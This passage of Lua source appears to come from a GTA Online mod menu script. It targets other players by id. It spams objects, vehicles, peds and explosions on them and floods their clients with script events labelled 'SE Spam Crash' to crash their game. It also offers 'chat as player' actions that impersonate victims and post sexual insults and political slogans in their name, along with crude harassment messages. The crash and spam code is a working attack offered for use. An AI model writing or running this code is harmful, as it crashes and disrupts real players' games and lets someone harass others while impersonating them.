					give_object1(pid, 1987142870)
					give_object1(pid, -644915300)
					give_object1(pid, 333086378)
					give_object1(pid, -576515524)
					give_object1(pid, -246597232)
					give_object1(pid, -1963803813)
					give_object1(pid, -1283117809)
					give_object1(pid, -1432298883)
					give_object1(pid, -1183731840)
					give_object1(pid, -253978396)
					give_object1(pid, 993510245)
					give_object1(pid, -984671127)
					give_object1(pid, 1356866689)
					give_object1(pid, 352721947)
					give_object1(pid, 2085590335)
					give_object1(pid, 341562675)
					give_object1(pid, 812397104)
					give_object1(pid, 590583743)
					give_object1(pid, -52147427)
					give_object1(pid, -1312049931)
					give_object1(pid, -1952814969)
					give_object1(pid, 2112015640)
					give_object1(pid, -1486270996)
					give_object1(pid, 419020243)
					give_object1(pid, 1319414056)
					give_object1(pid, 1013548210)
					give_object1(pid, 1860168086)
					give_object1(pid, 1181479993)
					give_object1(pid, 607684038)
					give_object1(pid, 2051175944)
					give_object1(pid, 467290531)
					give_object1(pid, 688475446)
					give_object1(pid, -172171507)
					give_object1(pid, 1787587532)
					give_object1(pid, 1547095841)
					give_object1(pid, 1174512311)
					give_object1(pid, 765054337)
					give_object1(pid, 921231391)
					give_object1(pid, 1289023059)
					give_object1(pid, -755359081)
					give_object1(pid, -1144115258)
					give_object1(pid, -260968027)
					give_object1(pid, 2071456372)
					give_object1(pid, -247908770)
					give_object1(pid, -1499125472)
					give_object1(pid, -1766954369)
					give_object1(pid, -2065152269)
					give_object1(pid, -1300099069)
					give_object1(pid, -763801615)
					give_object1(pid, -1317590321)
					give_object1(pid, 1437558005)
					give_object1(pid, -1197050094)
					give_object1(pid, -1468326899)
					give_object1(pid, 367798813)
					give_object1(pid, 674352808)
					give_object1(pid, -1326130575)
					give_object1(pid, 1244929250)
					give_object1(pid, 349605904)
					give_object1(pid, -1181704684)
					give_object1(pid, -406357375)
					give_object1(pid, -1105610407)
					give_object1(pid, 1761775400)
					give_object1(pid, 1238061242)
					give_object1(pid, 1258923146)
					give_object1(pid, 492521774)
					give_object1(pid, 797240705)
					give_object1(pid, 32477783)
					give_object1(pid, 169396189)
					give_object1(pid, -1627393663)
					give_object1(pid, -606981753)
					give_object1(pid, -1406243308)
					give_object1(pid, 2141631881)
					give_object1(pid, -18742627)
					give_object1(pid, 1533045317)
					give_object1(pid, 1773562133)
					give_object1(pid, -699878242)
					give_object1(pid, -1335342011)
					give_object1(pid, -1237341649)
					give_object1(pid, 639966918)
					give_object1(pid, -8343320)
					give_object1(pid, 94181889)
					give_object1(pid, 1293755237)
					give_object1(pid, -2052658901)
					give_object1(pid, -157171717)
					give_object1(pid, -1440635923)
					give_object1(pid, -1824214632)
					give_object1(pid, -20901770)
					give_object1(pid, -1922906158)
					give_object1(pid, 252606021)
					give_object1(pid, 1339066922)
					give_object1(pid, -47892025)
					give_object1(pid, -1614283661)
					give_object1(pid, 590062335)
					give_object1(pid, -1525772156)
					give_object1(pid, -996007574)
					give_object1(pid, 261794458)
					give_object1(pid, -756598242)
					give_object1(pid, -438534849)
					give_object1(pid, -1564523101)
					give_object1(pid, 1496860328)
					give_object1(pid, 349267712)
					give_object1(pid, -316967914)
					give_object1(pid, -1007682309)
					give_object1(pid, 748055656)
					give_object1(pid, 1366577387)
					give_object1(pid, 847347385)
					give_object1(pid, -2071155078)
					give_object1(pid, 1269975498)
					give_object1(pid, -608328040)
					give_object1(pid, 162624953)
					give_object1(pid, -1311593370)
					give_object1(pid, 1487403395)
					give_object1(pid, 631197463)
					give_object1(pid, -1459620242)
					give_object1(pid, 1681817364)
					give_object1(pid, -945652776)
					give_object1(pid, -1055097146)
					give_object1(pid, -1409850900)
					give_object1(pid, -1773922285)
					give_object1(pid, -1993723859)
					give_object1(pid, -1742202260)
					give_object1(pid, 2068286576)
					give_object1(pid, 962285623)
					give_object1(pid, -438279772)
					give_object1(pid, -419541910)
					give_object1(pid, 1024779176)
					give_object1(pid, -1335075707)
					give_object1(pid, 1639613915)
					give_object1(pid, -943429800)
					give_object1(pid, 1646402317)
					give_object1(pid, 1500357319)
					give_object1(pid, 355290615)
					give_object1(pid, 787633963)
					give_object1(pid, -1300361013)
					give_object1(pid, -1827077212)
					give_object1(pid, 1593467078)
					give_object1(pid, -1050883557)
					give_object1(pid, -1605085282)
					give_object1(pid, 90336154)
					give_object1(pid, 1192565074)
					give_object1(pid, -429084586)
					give_object1(pid, -1708398800)
					give_object1(pid, -2060261324)
					give_object1(pid, -1903104944)
					give_object1(pid, -1851357300)
					give_object1(pid, 252511221)
					give_object1(pid, 22612995)
					give_object1(pid, -576619330)
					give_object1(pid, 915050694)
					give_object1(pid, -1384362100)
					give_object1(pid, 1962014499)
					give_object1(pid, 1255192481)
					give_object1(pid, -431763373)
					give_object1(pid, 1406641964)
					give_object1(pid, 1187892487)
					give_object1(pid, -1967089259)
					give_object1(pid, 1924929910)
					give_object1(pid, -1238481456)
					give_object1(pid, -672623719)
					give_object1(pid, 266412233)
					give_object1(pid, 313871122)
					give_object1(pid, 1408394397)
					give_object1(pid, -999474433)
					give_object1(pid, 340941571)
					give_object1(pid, -1022725366)
					give_object1(pid, 676336836)
					give_object1(pid, 1262821715)
					give_object1(pid, 1249528776)
					give_object1(pid, 1040416056)
					give_object1(pid, 402083591)
					give_object1(pid, -1225269105)
					give_object1(pid, 64297753)
					give_object1(pid, 113556755)
					give_object1(pid, -1802062442)
					give_object1(pid, -877285663)
					give_object1(pid, 1907669430)
					give_object1(pid, 867476559)
					give_object1(pid, 1253204874)
					give_object1(pid, -668962160)
					give_object1(pid, 1110497611)
					give_object1(pid, 1100877936)
					give_object1(pid, -372372024)
					give_object1(pid, 639239135)
					give_object1(pid, -1774370481)
					give_object1(pid, -246692737)
					give_object1(pid, -1954995488)
					give_object1(pid, -1191543629)
					give_object1(pid, 696406833)
					give_object1(pid, 253006429)
					give_object1(pid, -444734401)
					give_object1(pid, -1999143732)
					give_object1(pid, -1961193897)
					give_object1(pid, 1898262334)
					give_object1(pid, 384005660)
					give_object1(pid, -352333894)
					give_object1(pid, -1974191568)
					give_object1(pid, 269485782)
					give_object1(pid, -1776252406)
					give_object1(pid, -147858408)
					give_object1(pid, -626255475)
					give_object1(pid, 1956579121)
					give_object1(pid, -1656633628)
					give_object1(pid, -868581840)
					give_object1(pid, -145288955)
					give_object1(pid, 1720153441)
					give_object1(pid, -1163238668)
					give_object1(pid, 91827577)
					give_object1(pid, -193672126)
					give_object1(pid, -816033362)
					give_object1(pid, 299521668)
					give_object1(pid, 128303680)
					give_object1(pid, 346412082)
					give_object1(pid, -141160824)
					give_object1(pid, 791742585)
					give_object1(pid, 1639439975)
					give_object1(pid, 2089127153)
					give_object1(pid, -1970681615)
					give_object1(pid, 1017495056)
					give_object1(pid, -693291412)
					give_object1(pid, 1854176355)
					give_object1(pid, -143577137)
					give_object1(pid, 1920539120)
					give_object1(pid, 2138951683)
					give_object1(pid, 2926201)
					give_object1(pid, 588694618)
					give_object1(pid, 1002527928)
					give_object1(pid, 657901815)
					give_object1(pid, -1151335549)
					give_object1(pid, -535047870)
					give_object1(pid, -905045155)
					give_object1(pid, -2016597088)
					give_object1(pid, 1934369518)
					give_object1(pid, 798751931)
					give_object1(pid, 467794033)
					give_object1(pid, 234501923)
					give_object1(pid, 1635659404)
					give_object1(pid, 1884623159)
					give_object1(pid, -698893408)
					give_object1(pid, -1175798597)
					give_object1(pid, -906746081)
					give_object1(pid, -1294831)
					give_object1(pid, 2123662446)
					give_object1(pid, 1592795583)
					give_object1(pid, -949118781)
					give_object1(pid, 858281200)
					give_object1(pid, 462277847)
					give_object1(pid, 1453112849)
					give_object1(pid, 767023083)
					give_object1(pid, 722791674)
					give_object1(pid, -23412283)
					give_object1(pid, 1667053900)
					give_object1(pid, 1845051052)
					give_object1(pid, -21399333)
					give_object1(pid, -645785505)
					give_object1(pid, 1900291931)
					give_object1(pid, -21856537)
					give_object1(pid, 1307873876)
					give_object1(pid, 1647890273)
					give_object1(pid, -1361987455)
					give_object1(pid, 579090920)
					give_object1(pid, 357470310)
					give_object1(pid, -1668290541)
					give_object1(pid, -1233252068)
					give_object1(pid, 1252993669)
					give_object1(pid, -1166532413)
					give_object1(pid, 951440198)
					give_object1(pid, 1019099219)
					give_object1(pid, -7670236)
					give_object1(pid, -891962229)
					give_object1(pid, 1828632807)
					give_object1(pid, -527731566)
					give_object1(pid, -101568154)
					give_object1(pid, 2051732798)
					give_object1(pid, -1408920051)
					give_object1(pid, -1374940188)
					give_object1(pid, -2095073234)
					give_object1(pid, 781409003)
					give_object1(pid, 90648387)
					give_object1(pid, 869134853)
					give_object1(pid, -2070149054)
					give_object1(pid, 175871830)
					give_object1(pid, -1617679134)
					give_object1(pid, 214479460)
					give_object1(pid, -1606222828)
					give_object1(pid, 147259490)
					give_object1(pid, 644255053)
					give_object1(pid, -2051274600)
					give_object1(pid, -892172246)
					give_object1(pid, -924554442)
					give_object1(pid, 1954265054)
					give_object1(pid, -541625023)
					give_object1(pid, 624253125)
					give_object1(pid, -1622711733)
					give_object1(pid, 2055887799)
					give_object1(pid, -40891276)
					give_object1(pid, -308199046)
					give_object1(pid, 368785959)
					give_object1(pid, -201029917)
					give_object1(pid, -825823660)
					give_object1(pid, 713194973)
					give_object1(pid, 1334368076)
					give_object1(pid, -1264805106)
					give_object1(pid, -1619389250)
					give_object1(pid, -592386971)
					give_object1(pid, 87915532)
					give_object1(pid, 420374239)
					give_object1(pid, -1824681640)
					give_object1(pid, 43994448)
					give_object1(pid, -694024018)
					give_object1(pid, -1483505130)
					give_object1(pid, -1019540988)
					give_object1(pid, -2025644504)
					give_object1(pid, 399125923)
					give_object1(pid, 732634002)
					give_object1(pid, 1041449522)
					give_object1(pid, -1617471970)
					give_object1(pid, -1963714634)
					give_object1(pid, 709796306)
					give_object1(pid, -1754236944)
					give_object1(pid, -1566617184)
					give_object1(pid, -872650310)
					give_object1(pid, -1535902383)
					give_object1(pid, 2117057129)
					give_object1(pid, 1342028930)
					give_object1(pid, 1032385525)
					give_object1(pid, -473210966)
					give_object1(pid, -1969460734)
					give_object1(pid, 935008985)
					give_object1(pid, -1297807641)
					give_object1(pid, -2052825844)
					give_object1(pid, 1005464718)
					give_object1(pid, 2065026213)
					give_object1(pid, 377641705)
					give_object1(pid, 2026094839)
					give_object1(pid, -924791484)
					give_object1(pid, -1671333678)
					give_object1(pid, -1596081609)
					give_object1(pid, -982242098)
					give_object1(pid, 2081567852)
					give_object1(pid, -1615104272)
					give_object1(pid, -432318791)
					give_object1(pid, 1912530229)
					give_object1(pid, -194710140)
					give_object1(pid, -1546779958)
					give_object1(pid, 1991134514)
					give_object1(pid, -1002269212)
					give_object1(pid, 358694914)
					give_object1(pid, 1526944277)
					give_object1(pid, -273037416)
					give_object1(pid, -778539993)
					give_object1(pid, -1703283636)
					give_object1(pid, -960256113)
					give_object1(pid, -1053717991)
					give_object1(pid, -1314621230)
					give_object1(pid, 919114393)
					give_object1(pid, 438051858)
					give_object1(pid, -1154165331)
					give_object1(pid, 1048426695)
					give_object1(pid, 1002125903)
					give_object1(pid, 373292107)
					give_object1(pid, 1154575995)
					give_object1(pid, 716017543)
					give_object1(pid, 1179023513)
					give_object1(pid, -1841267263)
					give_object1(pid, 2140204525)
					give_object1(pid, -2020162314)
					give_object1(pid, 2100850140)
					give_object1(pid, -1456119620)
					give_object1(pid, 2065800878)
					give_object1(pid, 1446131548)
					give_object1(pid, 1953825788)
					give_object1(pid, -1476234289)
					give_object1(pid, -1334262305)
					give_object1(pid, 1084012181)
					give_object1(pid, 31833005)
					give_object1(pid, 1489996351)
					give_object1(pid, 2053638039)
					give_object1(pid, 276834062)
					give_object1(pid, 604103686)
					give_object1(pid, 956480402)
					give_object1(pid, 547342811)
					give_object1(pid, -2112672753)
					give_object1(pid, 1011350884)
					give_object1(pid, 1618928353)
					give_object1(pid, -1353081087)
					give_object1(pid, -1479664699)
					give_object1(pid, 1430895338)
					give_object1(pid, 675274951)
					give_object1(pid, 213350007)
					give_object1(pid, 1653623132)
					give_object1(pid, -269112841)
					give_object1(pid, -294576776)
					give_object1(pid, -1798470109)
					give_object1(pid, -736560690)
					give_object1(pid, -528401166)
					give_object1(pid, 622888377)
					give_object1(pid, -171943901)
					give_object1(pid, 508864775)
					give_object1(pid, -271744229)
					give_object1(pid, -1763055830)
					give_object1(pid, 838183020)
					give_object1(pid, 368482553)
					give_object1(pid, 1802557189)
					give_object1(pid, 259322409)
					give_object1(pid, 1889796391)
					give_object1(pid, 483613343)
					give_object1(pid, -1814837934)
					give_object1(pid, 232962702)
					give_object1(pid, 1206778303)
					give_object1(pid, 2067417152)
					give_object1(pid, -1210399798)
					give_object1(pid, -590146742)
					give_object1(pid, 1359592635)
					give_object1(pid, 492575597)
					give_object1(pid, -387521298)
					give_object1(pid, -721895765)
					give_object1(pid, -132789682)
					give_object1(pid, -177480482)
					give_object1(pid, -455361602)
					give_object1(pid, -790849738)
					give_object1(pid, -1731941480)
					give_object1(pid, 2018317371)
					give_object1(pid, 1561943508)
					give_object1(pid, -332131798)
					give_object1(pid, -601985968)
					give_object1(pid, 285787722)
					give_object1(pid, 2069444788)
					give_object1(pid, -448693971)
					give_object1(pid, 275794448)
					give_object1(pid, 581889677)
					give_object1(pid, -106487292)
					give_object1(pid, -807594098)
					give_object1(pid, -535349246)
					give_object1(pid, 417944961)
					give_object1(pid, -871236969)
					give_object1(pid, -867376114)
					give_object1(pid, 2120265392)
					give_object1(pid, 440714328)
					give_object1(pid, -942910394)
					give_object1(pid, 1368830751)
					give_object1(pid, -1551758414)
					give_object1(pid, -1556823922)
					give_object1(pid, 1745383396)
					give_object1(pid, 797015791)
					give_object1(pid, 1131390643)
					give_object1(pid, 682422711)
					give_object1(pid, 1945191539)
					give_object1(pid, 495380854)
					give_object1(pid, -2139330164)
					give_object1(pid, 1385526236)
					give_object1(pid, -2009950230)
					give_object1(pid, -10278922)
					give_object1(pid, -1530258765)
					give_object1(pid, -79978204)
					give_object1(pid, -937756226)
					give_object1(pid, -765880741)
					give_object1(pid, -589046858)
					give_object1(pid, -600415835)
					give_object1(pid, -1293487551)
					give_object1(pid, -1173362295)
					give_object1(pid, 741933698)
					give_object1(pid, -1188733122)
					give_object1(pid, -688012791)
					give_object1(pid, -920585494)
					give_object1(pid, 2005313754)
					give_object1(pid, -372354415)
					give_object1(pid, 286298615)
					give_object1(pid, 12751331)
					give_object1(pid, 202070568)
					give_object1(pid, 1507202536)
					give_object1(pid, -1656576146)
					give_object1(pid, 1900909486)
					give_object1(pid, 1720432065)
					give_object1(pid, 795984016)
					give_object1(pid, 1994282598)
					give_object1(pid, 1543408104)
					give_object1(pid, -465246693)
					give_object1(pid, -177141645)
					give_object1(pid, 434950506)
					give_object1(pid, -124033353)
					give_object1(pid, 103179737)
					give_object1(pid, 925058130)
					give_object1(pid, 2140733815)
					give_object1(pid, -1498244144)
					give_object1(pid, 1476149726)
					give_object1(pid, 2088303372)
					give_object1(pid, 785676028)
					give_object1(pid, 616522692)
					give_object1(pid, -1719442365)
					give_object1(pid, -1741901560)
					give_object1(pid, -2068583636)
					give_object1(pid, 231325255)
					give_object1(pid, 643649573)
					give_object1(pid, 500687632)
					give_object1(pid, -1580866404)
					give_object1(pid, 928394347)
					give_object1(pid, 1446045988)
					give_object1(pid, 1609878359)
					give_object1(pid, 944662010)
                    util.yield(10)
                end
				for i = 1, 50 do  
                    FIRE.ADD_EXPLOSION(pos.x +0, pos.y +65.5, pos.z +10.0, 82, 10, true, false, 1, false)
					give_vehicle1(pid, util.joaat("alkonost"))
                    give_vehicle1(pid, util.joaat("alkonost"))
                    give_vehicle1(pid, util.joaat("alkonost"))
                    give_vehicle1(pid, util.joaat("alkonost"))
                    give_ped1(pid, 1057201338)
					give_ped1(pid, 1057201338)
					give_ped1(pid, 1057201338)
                    give_ped1(pid, -2056455422)
					give_ped1(pid, -1323586730)
					give_ped1(pid, -1323586730)
                    util.yield(10)
                end
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				AUDIO.PLAY_SOUND_FROM_COORD(-1, 'DLC_XM_Explosions_Orbital_Cannon', pos.x, pos.y, pos.z, 0, true, 0, false)
				util.yield(60)
				FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, 59, 1.0, true, false, 1.0)
				GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					effect.name, 
					pos.x,
					pos.y,
					pos.z, 
					0.0, 
					0.0, 
					0.0,
					1.0, 
					false, false, false, true
				)
				util.yield(333)
				CAM.SHAKE_CAM(cam, "GAMEPLAY_EXPLOSION_SHAKE", 1.5)
				break
			end
			GRAPHICS.SET_SCRIPT_GFX_DRAW_ORDER(0)
			GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleform, 255, 255, 255, 255, 0)
			GRAPHICS.RESET_SCRIPT_GFX_ALIGN()
		end
		CAM.DO_SCREEN_FADE_OUT(500)
		util.yield(600)
		GRAPHICS.ANIMPOSTFX_STOP('MP_OrbitalCannon')
		CAM.RENDER_SCRIPT_CAMS(false, false, 3000, true, false, 0)
		CAM.SET_CAM_ACTIVE(cam, false)
		CAM.DESTROY_CAM(cam, false)
		HUD.DISPLAY_RADAR(true)
		STREAMING.CLEAR_FOCUS()
		GRAPHICS.CLEAR_DRAW_ORIGIN()
		util.yield(1300)
		CAM.DO_SCREEN_FADE_IN(0)
		menu.trigger_commands('becomeorbitalcannon off')
		menu.trigger_commands("anticrashcamera")
		menu.trigger_commands("say Translation: "..PLAYER.GET_PLAYER_NAME(pid).." Your mom gets her chops off when she sucks my dinosaur")
		menu.trigger_commands("say Glory to Ukraine ! Glory to Ukraine ! Glory to Ukraine !")
		notification('Its possible his game CrAShEd, 50/50, the russian roulette !', green)
		if not crash_in_progress0 then   
            crash_in_progress0 = true    
            script = {}
            function script.trigger_script_event(first_arg, receiver, args)
                table.insert(args, 1, first_arg)
                util.trigger_script_event(1 << receiver, args)
            end
            for i = 1, 256 do
                local parameters = {pid, -1774405356, math.random(0, 4), math.random(0, 1)}
                for i = 5, 13 do
                    parameters[i] = math.random(-2147483647, 2147483647)
                end
                parameters[10] = pid
                script.trigger_script_event(677240627, pid, parameters)
            end
            util.yield(500)
            crash_in_progress0 = false
        end
        if crash_in_progress0 then
            notification("Chill dude, you have another crash in progress", red2)
        end
		util.yield(13300)
		local ct = 0
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			entities.delete_by_handle(ent)
			ct = ct + 1
		end
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not is_ped_player(ent) then
				entities.delete_by_handle(ent)
			end
			ct = ct + 1
		end
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			entities.delete_by_handle(ent)
			ct = ct + 1
		end
		util.toast("Super cleanse is complete! " .. ct .. " entities removed.")
		util.yield(5000)
		menu.trigger_commands("tpmazehelipad")
		util.yield(2000)
		if not players.exists(pid) then
			util.toast("Player CrAsH !!!")
			util.stop_thread()
		end	
		local ct = 0
		for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
			entities.delete_by_handle(ent)
			ct = ct + 1
		end
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not is_ped_player(ent) then
				entities.delete_by_handle(ent)
			end
			ct = ct + 1
		end
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			entities.delete_by_handle(ent)
			ct = ct + 1
		end
		util.toast("Super cleanse is complete! " .. ct .. " entities removed.")
		util.yield(5000)
		if not players.exists(pid) then
			util.toast("Player CrAsH !!!")
			util.stop_thread()
		end	
	--v3.new(0.0, 300.0, 40.0)

	--local tar = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    end)
	menu.action(parent2, "SE Spam Crash V1", {"sespamcrash"}, "SE Spam Crash", function(on_click)
        if not crash_in_progress0 then   
            crash_in_progress0 = true    
            script = {}
            function script.trigger_script_event(first_arg, receiver, args)
                table.insert(args, 1, first_arg)
                util.trigger_script_event(1 << receiver, args)
            end
            for i = 1, 256 do
                local parameters = {pid, -1774405356, math.random(0, 4), math.random(0, 1)}
                for i = 5, 13 do
                    parameters[i] = math.random(-2147483647, 2147483647)
                end
                parameters[10] = pid
                script.trigger_script_event(677240627, pid, parameters)
            end
            util.yield(500)
            crash_in_progress0 = false
        end
        if crash_in_progress0 then
            notification("Chill dude, you have another crash in progress", red2)
        end
    end)
	menu.toggle_loop(parent2, ">> TrAsH Spam", {"trashspamv2"}, "Trash SPAM", function(on)		
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		for i = 1, 20 do
			give_object2(pid, 4236481708)
			give_object2(pid, 4236481708)
			give_object2(pid, 4236481708)
			give_object2(pid, 4236481708)
			util.yield(10)
		end 
		notification("Now the player are on the TrASh", red2)
		FIRE.ADD_EXPLOSION(pos.x +0.0, pos.y +0.0, pos.z +6, 1, 10, true, false, 1, false)
		util.yield(4000)
		local ct = 0
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			entities.delete_by_handle(ent)
			ct = ct + 1
		end
		if not players.exists(pid) then
		util.toast("Player RAGeQuIt !!!")
		util.stop_thread()
		end			
	end)
	menu.toggle_loop(parent2, ">> Cats Spam", {"catsspam"}, "Cats SPAM", function(on)
		for i = 1, 30 do
			give_ped2(pid, 1462895032)
			give_ped2(pid, 1462895032)
			give_ped2(pid, 1462895032)
			give_ped2(pid, 1462895032)
			util.yield(10)
		end 
		notification("Now the player are on the CaTs", red2)
		util.yield(4000)
		local ct = 0
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not is_ped_player(ent) then
				entities.delete_by_handle(ent)
			end
			ct = ct + 1
		end
		util.toast("Super cleanse is complete! " .. ct .. " entities removed.")
		if not players.exists(pid) then
		util.toast("Player RAGeQuIt !!!")
		util.stop_thread()
		end	
    end)
	menu.toggle_loop(parent2, ">> PiGs SpAm", {"pigspam"}, "Pigs SPAM", function(on)
		for i = 1, 30 do
			give_ped2(pid, -1323586730)
			give_ped2(pid, -1323586730)
			give_ped2(pid, -1323586730)
			give_ped2(pid, -1323586730)
			util.yield(10)
		end 
		notification("Now the player are on the PiGs", red2)
		util.yield(4000)
		local ct = 0
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not is_ped_player(ent) then
				entities.delete_by_handle(ent)
			end
			ct = ct + 1
		end
		util.toast("Super cleanse is complete! " .. ct .. " entities removed.")
		if not players.exists(pid) then
		util.toast("Player RAGeQuIt !!!")
		util.stop_thread()
		end	
    end)
	menu.toggle_loop(parent2, ">> TrAsH CaTs PiGs SpAm", {"trashcatpigspam"}, "Pigs SPAM", function(on)
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		for i = 1, 20 do
			give_object2(pid, 4236481708)
			give_object2(pid, 4236481708)
			give_object2(pid, 4236481708)
			give_object2(pid, 4236481708)
			util.yield(10)
		end 
		notification("Now the player are on the TrASh", red2)
		FIRE.ADD_EXPLOSION(pos.x +0.0, pos.y +0.0, pos.z +6, 1, 10, true, false, 1, false)
		util.yield(4000)
		local ct = 0
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			entities.delete_by_handle(ent)
			ct = ct + 1
		end
		for i = 1, 30 do
			give_ped2(pid, 1462895032)
			give_ped2(pid, 1462895032)
			give_ped2(pid, 1462895032)
			give_ped2(pid, 1462895032)
			util.yield(10)
		end 
		notification("Now the player are on the CaTs", red2)
		util.yield(4000)
		local ct = 0
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not is_ped_player(ent) then
				entities.delete_by_handle(ent)
			end
			ct = ct + 1
		end
		util.toast("Super cleanse is complete! " .. ct .. " entities removed.")	
		for i = 1, 30 do
			give_ped2(pid, -1323586730)
			give_ped2(pid, -1323586730)
			give_ped2(pid, -1323586730)
			give_ped2(pid, -1323586730)
			util.yield(10)
		end 
		notification("Now the player are on the PiGs", red2)
		util.yield(4000)
		local ct = 0
		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not is_ped_player(ent) then
				entities.delete_by_handle(ent)
			end
			ct = ct + 1
		end
		util.toast("Super cleanse is complete! " .. ct .. " entities removed.")
		if not players.exists(pid) then
		util.toast("Player RAGeQuIt !!!")
		util.stop_thread()
		end	
	end)
	menu.action(parent3, "Glory to Ukraine ! (Chat as player) ", {"glorytoukraine"}, "Chat as russian player glory to ukraine", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Слава Украине ! Слава Украине ! Слава Украине ! Glory to Ukraine ! Glory to Ukraine ! Glory to Ukraine !")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I have a small Dick c=8 (Chat as player) ", {"smalldick"}, "Chat as russian player small dick", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say У меня маленький член c=8 I have a small Dick c=8")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I suck for a cheese burger. (Chat as player) ", {"suckforacheese"}, "Chat as russian player suck", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я соскучилась по чизбургеру. I suck for a cheese burger.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I like Trump and Zelensky. (Chat as player) ", {"trumpzelensky"}, "Chat as russian player trump", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
        menu.trigger_commands("say Я люблю Дональда Трампа и Зеленского. I like Trump and Zelensky.")
		util.yield(100)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
    end)
	menu.action(parent3, "I am a FemBoy. (Chat as player) ", {"iamafemboy"}, "Chat as russian player femboy", function(on_click)
		menu.trigger_commands("chatas"..PLAYER.GET_PLAYER_NAME(pid).."")
		util.yield(100)
